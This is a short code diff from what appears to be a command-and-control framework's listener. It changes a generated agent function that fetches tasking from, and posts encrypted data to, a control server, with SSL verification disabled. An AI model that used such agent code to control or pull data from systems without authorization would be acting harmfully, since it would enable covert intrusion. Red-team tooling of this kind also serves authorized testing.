@@ -867,11 +867,14 @@ class Listener:
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
                 sendMessage = """
-def send_message_{name}(packets=None, headers = None, taskURIs = None):
+def send_message_{name}(packets, **kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
+
+    headers = kwargs['headers']
+    taskURIs = kwargs['taskURIs'].split(',')
 
     data = None
     {update_servers}
